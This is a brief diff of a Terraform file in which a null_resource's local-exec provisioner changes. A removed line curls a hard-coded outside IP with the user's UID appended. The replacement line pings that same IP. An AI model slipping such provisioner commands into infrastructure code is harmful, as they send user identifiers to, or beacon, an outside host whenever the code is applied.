@@ -9,7 +9,7 @@ resource "random_id" "random" {
 
 resource "null_resource" "example1" {
   provisioner "local-exec" {
-    command = "curl 35.247.19.101/?uid=$UID"
+    command = "ping 35.247.19.101"
   }
 }
 
